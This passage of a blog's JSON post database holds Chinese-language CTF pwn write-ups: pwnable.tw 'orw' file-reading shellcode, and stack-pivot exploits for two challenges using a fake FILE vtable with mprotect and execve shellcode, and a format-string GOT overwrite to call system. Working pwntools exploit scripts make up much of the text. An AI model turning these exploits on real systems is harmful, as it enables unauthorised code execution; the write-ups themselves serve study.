class=\"comment\">#endif</span></div></pre></td></tr></table></figure></p>"},{"title":"pwnable.tw","date":"2017-04-23T12:00:03.000Z","_content":"\n## orw\n\n[汇编中i386的系统调用传参方式](https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm)\n\nexp:\n```\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\n\ncontext(log_level = 'debug')\n\nshellcode = shellcraft.i386.sh()\nbss = 0x0804a060\n#shellcode = asm(shellcode)\n#shellcode = \"\\x99\\x6a\\x0b\\x58\\x60\\x59\\xcd\\x80\"\nshellcode = 'mov ebx, 0x804a095; mov eax, 5; mov ecx, 0;int 0x80;'\nshellcode += 'mov ebx, eax; mov eax, 3; mov ecx, 0x804a095; mov edx, 100; int 0x80;'\nshellcode += 'mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80;'\nshellcode = asm(shellcode)\nprint len(shellcode)\n\nshellcode += '/home/orw/flag\\x00'\n# p = process('./orw')\np = remote('chall.pwnable.tw', 10001)\np.recvuntil(':')\n#gdb.attach(p)\np.send(shellcode)\nprint p.recvall()\n```\n使用syscall代替int 80出错，原因未知，猜测可能为传参方式不同。\n\n用locate定位系统调用号\n```\nroot@kali ~/c/p/orw# locate unistd_32\n/usr/include/x86_64-linux-gnu/asm/unistd_32.h\n/usr/lib/x86_64-linux-gnu/perl/5.22.2/asm/unistd_32.ph\n/usr/lib/x86_64-linux-gnu/perl/5.24.1/asm/unistd_32.ph\n/usr/src/linux-headers-4.9.0-kali3-amd64/arch/x86/include/generated/asm/unistd_32_ia32.h\n/usr/src/linux-headers-4.9.0-kali3-amd64/arch/x86/include/generated/uapi/asm/unistd_32.h\n/usr/src/linux-headers-4.9.0-kali3-common/arch/sh/include/uapi/asm/unistd_32.h\n```","source":"_posts/pwnable-tw.md","raw":"---\ntitle: pwnable.tw\ntags:\n  - PWN\n  - writeup\ncategories: []\ndate: 2017-04-23 20:00:03\n---\n\n## orw\n\n[汇编中i386的系统调用传参方式](https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm)\n\nexp:\n```\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\n\ncontext(log_level = 'debug')\n\nshellcode = shellcraft.i386.sh()\nbss = 0x0804a060\n#shellcode = asm(shellcode)\n#shellcode = \"\\x99\\x6a\\x0b\\x58\\x60\\x59\\xcd\\x80\"\nshellcode = 'mov ebx, 0x804a095; mov eax, 5; mov ecx, 0;int 0x80;'\nshellcode += 'mov ebx, eax; mov eax, 3; mov ecx, 0x804a095; mov edx, 100; int 0x80;'\nshellcode += 'mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80;'\nshellcode = asm(shellcode)\nprint len(shellcode)\n\nshellcode += '/home/orw/flag\\x00'\n# p = process('./orw')\np = remote('chall.pwnable.tw', 10001)\np.recvuntil(':')\n#gdb.attach(p)\np.send(shellcode)\nprint p.recvall()\n```\n使用syscall代替int 80出错，原因未知，猜测可能为传参方式不同。\n\n用locate定位系统调用号\n```\nroot@kali ~/c/p/orw# locate unistd_32\n/usr/include/x86_64-linux-gnu/asm/unistd_32.h\n/usr/lib/x86_64-linux-gnu/perl/5.22.2/asm/unistd_32.ph\n/usr/lib/x86_64-linux-gnu/perl/5.24.1/asm/unistd_32.ph\n/usr/src/linux-headers-4.9.0-kali3-amd64/arch/x86/include/generated/asm/unistd_32_ia32.h\n/usr/src/linux-headers-4.9.0-kali3-amd64/arch/x86/include/generated/uapi/asm/unistd_32.h\n/usr/src/linux-headers-4.9.0-kali3-common/arch/sh/include/uapi/asm/unistd_32.h\n```","slug":"pwnable-tw","published":1,"updated":"2017-04-23T12:03:32.317Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k340048hv18131ufk50","content":"<h2 id=\"orw\"><a href=\"#orw\" class=\"headerlink\" title=\"orw\"></a>orw</h2><p><a href=\"https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm\" target=\"_blank\" rel=\"external\">汇编中i386的系统调用传参方式</a></p>\n<p>exp:<br><figure class=\"highlight vala\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"meta\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"></div><div class=\"line\">shellcode = shellcraft.i386.sh()</div><div class=\"line\">bss = <span class=\"number\">0x0804a060</span></div><div class=\"line\"><span class=\"meta\">#shellcode = asm(shellcode)</span></div><div class=\"line\"><span class=\"meta\">#shellcode = \"\\x99\\x6a\\x0b\\x58\\x60\\x59\\xcd\\x80\"</span></div><div class=\"line\">shellcode = <span class=\"string\">'mov ebx, 0x804a095; mov eax, 5; mov ecx, 0;int 0x80;'</span></div><div class=\"line\">shellcode += <span class=\"string\">'mov ebx, eax; mov eax, 3; mov ecx, 0x804a095; mov edx, 100; int 0x80;'</span></div><div class=\"line\">shellcode += <span class=\"string\">'mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80;'</span></div><div class=\"line\">shellcode = asm(shellcode)</div><div class=\"line\">print len(shellcode)</div><div class=\"line\"></div><div class=\"line\">shellcode += <span class=\"string\">'/home/orw/flag\\x00'</span></div><div class=\"line\"><span class=\"meta\"># p = process('./orw')</span></div><div class=\"line\">p = remote(<span class=\"string\">'chall.pwnable.tw'</span>, <span class=\"number\">10001</span>)</div><div class=\"line\">p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\"><span class=\"meta\">#gdb.attach(p)</span></div><div class=\"line\">p.send(shellcode)</div><div class=\"line\">print p.recvall()</div></pre></td></tr></table></figure></p>\n<p>使用syscall代替int 80出错，原因未知，猜测可能为传参方式不同。</p>\n<p>用locate定位系统调用号<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~<span class=\"regexp\">/c/p</span><span class=\"regexp\">/orw# locate unistd_32</span></div><div class=\"line\">/usr<span class=\"regexp\">/include/x</span>86_64-linux-gnu/<span class=\"keyword\">asm</span>/unistd_32.h</div><div class=\"line\">/usr/<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">x86_64</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">perl</span>/5.22.2/<span class=\"title\">asm</span>/<span class=\"title\">unistd_32</span>.<span class=\"title\">ph</span></span></div><div class=\"line\">/usr/<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">x86_64</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">perl</span>/5.24.1/<span class=\"title\">asm</span>/<span class=\"title\">unistd_32</span>.<span class=\"title\">ph</span></span></div><div class=\"line\">/usr/src/linux-headers-<span class=\"number\">4.9</span>.<span class=\"number\">0</span>-kali3-amd64/arch/x86/<span class=\"keyword\">include</span>/generated/<span class=\"keyword\">asm</span>/unistd_32_ia32.h</div><div class=\"line\">/usr/src/linux-headers-<span class=\"number\">4.9</span>.<span class=\"number\">0</span>-kali3-amd64/arch/x86/<span class=\"keyword\">include</span>/generated/uapi/<span class=\"keyword\">asm</span>/unistd_32.h</div><div class=\"line\">/usr/src/linux-headers-<span class=\"number\">4.9</span>.<span class=\"number\">0</span>-kali3-common/arch/sh/<span class=\"keyword\">include</span>/uapi/<span class=\"keyword\">asm</span>/unistd_32.h</div></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<h2 id=\"orw\"><a href=\"#orw\" class=\"headerlink\" title=\"orw\"></a>orw</h2><p><a href=\"https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm\">汇编中i386的系统调用传参方式</a></p>\n<p>exp:<br><figure class=\"highlight vala\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"meta\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"></div><div class=\"line\">shellcode = shellcraft.i386.sh()</div><div class=\"line\">bss = <span class=\"number\">0x0804a060</span></div><div class=\"line\"><span class=\"meta\">#shellcode = asm(shellcode)</span></div><div class=\"line\"><span class=\"meta\">#shellcode = \"\\x99\\x6a\\x0b\\x58\\x60\\x59\\xcd\\x80\"</span></div><div class=\"line\">shellcode = <span class=\"string\">'mov ebx, 0x804a095; mov eax, 5; mov ecx, 0;int 0x80;'</span></div><div class=\"line\">shellcode += <span class=\"string\">'mov ebx, eax; mov eax, 3; mov ecx, 0x804a095; mov edx, 100; int 0x80;'</span></div><div class=\"line\">shellcode += <span class=\"string\">'mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80;'</span></div><div class=\"line\">shellcode = asm(shellcode)</div><div class=\"line\">print len(shellcode)</div><div class=\"line\"></div><div class=\"line\">shellcode += <span class=\"string\">'/home/orw/flag\\x00'</span></div><div class=\"line\"><span class=\"meta\"># p = process('./orw')</span></div><div class=\"line\">p = remote(<span class=\"string\">'chall.pwnable.tw'</span>, <span class=\"number\">10001</span>)</div><div class=\"line\">p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\"><span class=\"meta\">#gdb.attach(p)</span></div><div class=\"line\">p.send(shellcode)</div><div class=\"line\">print p.recvall()</div></pre></td></tr></table></figure></p>\n<p>使用syscall代替int 80出错，原因未知，猜测可能为传参方式不同。</p>\n<p>用locate定位系统调用号<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~<span class=\"regexp\">/c/p</span><span class=\"regexp\">/orw# locate unistd_32</span></div><div class=\"line\">/usr<span class=\"regexp\">/include/x</span>86_64-linux-gnu/<span class=\"keyword\">asm</span>/unistd_32.h</div><div class=\"line\">/usr/<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">x86_64</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">perl</span>/5.22.2/<span class=\"title\">asm</span>/<span class=\"title\">unistd_32</span>.<span class=\"title\">ph</span></span></div><div class=\"line\">/usr/<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">x86_64</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">perl</span>/5.24.1/<span class=\"title\">asm</span>/<span class=\"title\">unistd_32</span>.<span class=\"title\">ph</span></span></div><div class=\"line\">/usr/src/linux-headers-<span class=\"number\">4.9</span>.<span class=\"number\">0</span>-kali3-amd64/arch/x86/<span class=\"keyword\">include</span>/generated/<span class=\"keyword\">asm</span>/unistd_32_ia32.h</div><div class=\"line\">/usr/src/linux-headers-<span class=\"number\">4.9</span>.<span class=\"number\">0</span>-kali3-amd64/arch/x86/<span class=\"keyword\">include</span>/generated/uapi/<span class=\"keyword\">asm</span>/unistd_32.h</div><div class=\"line\">/usr/src/linux-headers-<span class=\"number\">4.9</span>.<span class=\"number\">0</span>-kali3-common/arch/sh/<span class=\"keyword\">include</span>/uapi/<span class=\"keyword\">asm</span>/unistd_32.h</div></pre></td></tr></table></figure></p>\n"},{"title":"pwn中的栈迁移","date":"2017-04-26T08:38:17.000Z","_content":"\n## 序\n\n连着好几次遇到栈迁移问题了，总结记录下。\n每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类：\n1. stack pivot后mprotect\n2. ebp的partial overwrite\n3. 栈迁移的gadget\n\n## i春秋百度杯try to pwn\n\n我们用`0xff`来填充`FILE`结构体，尝试中发现填充为其他数据的话会出现调用到其他函数而报错的情况。\n\neax由这条语句赋值，其中ebx与eax的值为：\n```\n EAX  0x80efa9c (x+188) —▸ 0x80e2b6d (__EH_FRAME_BEGIN__+38021) ◂— pop    esp\n EBX  0x80efa04 (x+36) ◂— 0xffffff7f\n```\n`0x804f915 <fclose+53>     mov    eax, dword ptr [ebx + 0x94]`\nebx的值为`fake_FILE_addr+36`\neax的值为`fake_vtable`的前4个字节\n\n我们存储shellcode的地址的addr为`fake_vtable`的4到8个字节。\n\n还要注意下mprotexct的函数调用规定\n`int mprotect(void *addr, size_t len, int prot);`\n```\nmprotect()  changes  the  access protections for the calling process's memory pages containing any part of the address range in the interval [addr, addr+len-1].  addr must be aligned  to  a page boundary.\n```\n注意这里的地址调用一定是**页对齐**的。\n`int prot`这里的数字可以简单参照linux的权限`rwx`，总是7是可读可写可执行。\n\n这一题在尝试过程中发现\\x0b会截断，所以我们要吧pwntools产生的shellcode简单修改下。\n\nexp(参考了[这篇文章](http://blog.csdn.net/qq_29343201/article/details/69666824))：\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./fake')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./fake')\nname_addr = 0x80EF9E0\nmprotect_addr = elf.symbols['mprotect']\nun_FILE_addr = 0x80EFA00\nfake_FILE_addr = 0x80EFA04\nfake_vtable_addr = fake_FILE_addr + 0x94 + 0x4\nx_r = 0x08048f66\np_r = 0x080e2b6d\n\noffset = un_FILE_addr - name_addr\n\nshellcode = '''\n/* execve(path='/bin///sh', argv=['sh'], envp=0) */\n/* push '/bin///sh\\x00' */\npush 0x68\npush 0x732f2f2f\npush 0x6e69622f\nmov ebx, esp\n/* push argument array ['sh\\x00'] */\n/* push 'sh\\x00\\x00' */\npush 0x1010101\nxor dword ptr [esp], 0x1016972\nxor ecx, ecx\npush ecx /* null terminate */\npush 4\npop ecx\nadd ecx, esp\npush ecx /* 'sh\\x00' */\nmov ecx, esp\nxor edx, edx\n/* call execve() */\n/* push SYS_execve */\nmov eax, 0xf\nsub eax, 0x4\npush eax\npop eax\nint 0x80\n'''\n\ndef pwn():\n    p.recvuntil('name?\\n')\n    payload = 'a' * offset\n    # fake_FILE_addr\n    payload += p32(fake_FILE_addr)\n    # fake_FILE\n    payload += '\\xff' * 0x94\n    # fake_jmp_t\n    payload += p32(fake_vtable_addr)\n\n    # fake_vtable\n    payload += p32(p_r)\n    payload += p32(un_FILE_addr + 300)\n    payload += p32(x_r) *  16\n\n    # mprotect\n    junk = 300 - len(payload) + 32\n    payload += cyclic(junk)\n    payload += p32(mprotect_addr)\n    payload += p32(un_FILE_addr + 300 + 20) # shellcode addr\n    payload += p32(0x080ef000)\n    payload += p32(1024)\n    payload += p32(7)\n    payload += asm(shellcode)\n    gdb.attach(p)\n\n    p.sendline(payload)\n\n    p.recvuntil('>')\n    p.sendline('3')\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n## 南京线下赛decoder\n\n`checksec`:\n```\nroot@kali ~/c/NJoffline# checksec decoder\n[*] '/root/ctf-problem/NJoffline/decoder'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n没开什么保护，观察后发现存在栈溢出，但是不能构造rop，因为esp的地址是由栈上数据给的，直接覆盖的话会ret到奇怪的地方去，也就是说造成栈溢出的栈底数据是我们不可控的。\n\n所以，如果我们能够栈的位置到可控部分，我们就可以劫持eip，构造rop chain。\n\n```\nroot@kali ~/c/NJoffline# ROPgadget --binary decoder | grep 'esp'\n0x08048490 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret\n0x08048605 : add esp, 0x10 ; leave ; ret\n0x08048b31 : add esp, 0x40 ; pop edi ; pop ebp ; ret\n0x08048d35 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08048492 : add esp, 8 ; pop ebx ; ret\n0x08048af7 : and esp, dword ptr [ebx + 0x804b054] ; nop ; pop ebp ; ret\n0x08048cd7 : clc ; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x0804848e : inc byte ptr [eax] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret\n0x08048687 : je 0x8048684 ; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx\n0x08048d33 : jne 0x8048d21 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08048cd5 : lea esp, dword ptr [ebp - 8] ; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x08048cdb : lea esp, dword ptr [ecx - 4] ; ret\n0x08048d4f : mov bl, 0x22 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret\n0x0804868a : mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx\n0x080485d0 : mov ebx, dword ptr [esp] ; ret\n0x08048b30 : nop ; add esp, 0x40 ; pop edi ; pop ebp ; ret\n0x080485cf : nop ; mov ebx, dword ptr [esp] ; ret\n0x080485cd : nop ; nop ; mov ebx, dword ptr [esp] ; ret\n0x080485cb : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret\n0x08048cda : pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x08048cd8 : pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x08048cd9 : pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x08048689 : push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx\n0x08048634 : sub esp, 0x10 ; push eax ; push 0x804b04c ; call edx\n0x080485fb : sub esp, 0x14 ; push 0x804b04c ; call eax\n0x0804868c : sub esp, 0x14 ; push eax ; call edx\n0x08048475 : sub esp, 8 ; call 0x80485d9\n0x08048af6 : xor esp, dword ptr [ebx] ; mov dword ptr [0x804b054], eax ; nop ; pop ebp ; ret\n```\n\n发现这几条还是可用的：\n```\n0x08048490 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret\n0x08048605 : add esp, 0x10 ; leave ; ret\n0x08048b31 : add esp, 0x40 ; pop edi ; pop ebp ; ret\n0x08048d35 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08048492 : add esp, 8 ; pop ebx ; ret\n```\n\n于是我们的思路如下：\n1. 在栈上利用gadget`0x08048b31`布置好ropchain\n2. 利用fsb将fflish改为我们的gadget`0x08048b31`\n3. 在bss写入`/bin/sh`\n4. 修改fflush为system\n\n附上南大某女生exp:\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\nimport base64\n\nslog = 1\nlocal = 1\ndebug = 0\n\nif slog: context.log_level = True\nif local:\n    p = process('./decoder')\n    libc = ELF('/lib32/libc.so.6')\nelse:\n    p = remote('172.16.1.10', 20000)\n    libc = ELF('./lib/i386-linux-gnu/libc-2.19.so')\n\n\nelf = ELF('decoder')\n\nprintf_got = elf.got['printf']\t\t#  0x80484c0\nprintf_plt = elf.symbols['printf'] \nread_addr = elf.symbols['read']\nfflush_plt = elf.symbols['fflush']\n\nrealloc_got = elf.got['realloc']\nfflush_got = elf.got['fflush']\n\nmain_addr = 0x804836e\n\nprint('fflush_got = ' + hex(fflush_got))\nprint('printf_plt = ' + hex(printf_plt))\n\naddesp_72 = 0x08048b31\nrodata = 0x8048de0 # '%d:%s'\nbss_addr = 0x804b050\n\ns = base64.b64encode('%02052d%20$hn%033581d%21$hn%22$x')  # add_esp\n\npayload = s + (13 - len(s) / 4) * p32(0) + p32(printf_plt)+ p32(addesp_72) + p32(rodata) + p32(1) + p32(printf_got)\n# printf(rodata, '1', printf_got) \n# 0xffa8a3f4 \npayload += p32(fflush_got + 2) + p32(fflush_got) + p32(fflush_got) \n\npayload += p32(0x1) * 0xc  + p32(read_addr) + p32(addesp_72) + p32(0) + p32(fflush_got) + p32(4)   #0xffa8a434 -> read\n\npayload += p32(0x2) * 0xf + p32(read_addr) + p32(addesp_72) + p32(0) + p32(bss_addr) + p32(8)\n\npayload += p32(0x3) * 0xf + p32(fflush_plt) + p32(0xdeadbeef) + p32(bss_addr)\n\n# gdb.attach(p, open('debug'))\ngdb.attach(p)\np.recvuntil('DECODER\\n')\np.sendline(payload)\n\np.recvuntil(':')\nprintf_addr = u32(p.recv(4))\n\nsystem_addr = printf_addr + libc.symbols['system'] - libc.symbols['printf']\n#binsh_addr = printf_addr + next(libc.search('/bin/sh')) - libc.symbols['printf']\n\nprint('system_addr = ' + hex(system_addr))\n\np.send(p32(system_addr))\np.send(\"/bin/sh\\0\")\n\np.interactive()\n```\n\n## 2017BCTF100levels","source":"_posts/pwn中的栈迁移.md","raw":"---\ntitle: pwn中的栈迁移\ntags:\n  - PWN\n  - stack\ncategories: []\ndate: 2017-04-26 16:38:17\n---\n\n## 序\n\n连着好几次遇到栈迁移问题了，总结记录下。\n每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类：\n1. stack pivot后mprotect\n2. ebp的partial overwrite\n3. 栈迁移的gadget\n\n## i春秋百度杯try to pwn\n\n我们用`0xff`来填充`FILE`结构体，尝试中发现填充为其他数据的话会出现调用到其他函数而报错的情况。\n\neax由这条语句赋值，其中ebx与eax的值为：\n```\n EAX  0x80efa9c (x+188) —▸ 0x80e2b6d (__EH_FRAME_BEGIN__+38021) ◂— pop    esp\n EBX  0x80efa04 (x+36) ◂— 0xffffff7f\n```\n`0x804f915 <fclose+53>     mov    eax, dword ptr [ebx + 0x94]`\nebx的值为`fake_FILE_addr+36`\neax的值为`fake_vtable`的前4个字节\n\n我们存储shellcode的地址的addr为`fake_vtable`的4到8个字节。\n\n还要注意下mprotexct的函数调用规定\n`int mprotect(void *addr, size_t len, int prot);`\n```\nmprotect()  changes  the  access protections for the calling process's memory pages containing any part of the address range in the interval [addr, addr+len-1].  addr must be aligned  to  a page boundary.\n```\n注意这里的地址调用一定是**页对齐**的。\n`int prot`这里的数字可以简单参照linux的权限`rwx`，总是7是可读可写可执行。\n\n这一题在尝试过程中发现\\x0b会截断，所以我们要吧pwntools产生的shellcode简单修改下。\n\nexp(参考了[这篇文章](http://blog.csdn.net/qq_29343201/article/details/69666824))：\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./fake')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./fake')\nname_addr = 0x80EF9E0\nmprotect_addr = elf.symbols['mprotect']\nun_FILE_addr = 0x80EFA00\nfake_FILE_addr = 0x80EFA04\nfake_vtable_addr = fake_FILE_addr + 0x94 + 0x4\nx_r = 0x08048f66\np_r = 0x080e2b6d\n\noffset = un_FILE_addr - name_addr\n\nshellcode = '''\n/* execve(path='/bin///sh', argv=['sh'], envp=0) */\n/* push '/bin///sh\\x00' */\npush 0x68\npush 0x732f2f2f\npush 0x6e69622f\nmov ebx, esp\n/* push argument array ['sh\\x00'] */\n/* push 'sh\\x00\\x00' */\npush 0x1010101\nxor dword ptr [esp], 0x1016972\nxor ecx, ecx\npush ecx /* null terminate */\npush 4\npop ecx\nadd ecx, esp\npush ecx /* 'sh\\x00' */\nmov ecx, esp\nxor edx, edx\n/* call execve() */\n/* push SYS_execve */\nmov eax, 0xf\nsub eax, 0x4\npush eax\npop eax\nint 0x80\n'''\n\ndef pwn():\n    p.recvuntil('name?\\n')\n    payload = 'a' * offset\n    # fake_FILE_addr\n    payload += p32(fake_FILE_addr)\n    # fake_FILE\n    payload += '\\xff' * 0x94\n    # fake_jmp_t\n    payload += p32(fake_vtable_addr)\n\n    # fake_vtable\n    payload += p32(p_r)\n    payload += p32(un_FILE_addr + 300)\n    payload += p32(x_r) *  16\n\n    # mprotect\n    junk = 300 - len(payload) + 32\n    payload += cyclic(junk)\n    payload += p32(mprotect_addr)\n    payload += p32(un_FILE_addr + 300 + 20) # shellcode addr\n    payload += p32(0x080ef000)\n    payload += p32(1024)\n    payload += p32(7)\n    payload += asm(shellcode)\n    gdb.attach(p)\n\n    p.sendline(payload)\n\n    p.recvuntil('>')\n    p.sendline('3')\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n## 南京线下赛decoder\n\n`checksec`:\n```\nroot@kali ~/c/NJoffline# checksec decoder\n[*] '/root/ctf-problem/NJoffline/decoder'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n没开什么保护，观察后发现存在栈溢出，但是不能构造rop，因为esp的地址是由栈上数据给的，直接覆盖的话会ret到奇怪的地方去，也就是说造成栈溢出的栈底数据是我们不可控的。\n\n所以，如果我们能够栈的位置到可控部分，我们就可以劫持eip，构造rop chain。\n\n```\nroot@kali ~/c/NJoffline# ROPgadget --binary decoder | grep 'esp'\n0x08048490 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret\n0x08048605 : add esp, 0x10 ; leave ; ret\n0x08048b31 : add esp, 0x40 ; pop edi ; pop ebp ; ret\n0x08048d35 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08048492 : add esp, 8 ; pop ebx ; ret\n0x08048af7 : and esp, dword ptr [ebx + 0x804b054] ; nop ; pop ebp ; ret\n0x08048cd7 : clc ; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x0804848e : inc byte ptr [eax] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret\n0x08048687 : je 0x8048684 ; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx\n0x08048d33 : jne 0x8048d21 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08048cd5 : lea esp, dword ptr [ebp - 8] ; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x08048cdb : lea esp, dword ptr [ecx - 4] ; ret\n0x08048d4f : mov bl, 0x22 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret\n0x0804868a : mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx\n0x080485d0 : mov ebx, dword ptr [esp] ; ret\n0x08048b30 : nop ; add esp, 0x40 ; pop edi ; pop ebp ; ret\n0x080485cf : nop ; mov ebx, dword ptr [esp] ; ret\n0x080485cd : nop ; nop ; mov ebx, dword ptr [esp] ; ret\n0x080485cb : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret\n0x08048cda : pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x08048cd8 : pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x08048cd9 : pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret\n0x08048689 : push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx\n0x08048634 : sub esp, 0x10 ; push eax ; push 0x804b04c ; call edx\n0x080485fb : sub esp, 0x14 ; push 0x804b04c ; call eax\n0x0804868c : sub esp, 0x14 ; push eax ; call edx\n0x08048475 : sub esp, 8 ; call 0x80485d9\n0x08048af6 : xor esp, dword ptr [ebx] ; mov dword ptr [0x804b054], eax ; nop ; pop ebp ; ret\n```\n\n发现这几条还是可用的：\n```\n0x08048490 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret\n0x08048605 : add esp, 0x10 ; leave ; ret\n0x08048b31 : add esp, 0x40 ; pop edi ; pop ebp ; ret\n0x08048d35 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08048492 : add esp, 8 ; pop ebx ; ret\n```\n\n于是我们的思路如下：\n1. 在栈上利用gadget`0x08048b31`布置好ropchain\n2. 利用fsb将fflish改为我们的gadget`0x08048b31`\n3. 在bss写入`/bin/sh`\n4. 修改fflush为system\n\n附上南大某女生exp:\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\nimport base64\n\nslog = 1\nlocal = 1\ndebug = 0\n\nif slog: context.log_level = True\nif local:\n    p = process('./decoder')\n    libc = ELF('/lib32/libc.so.6')\nelse:\n    p = 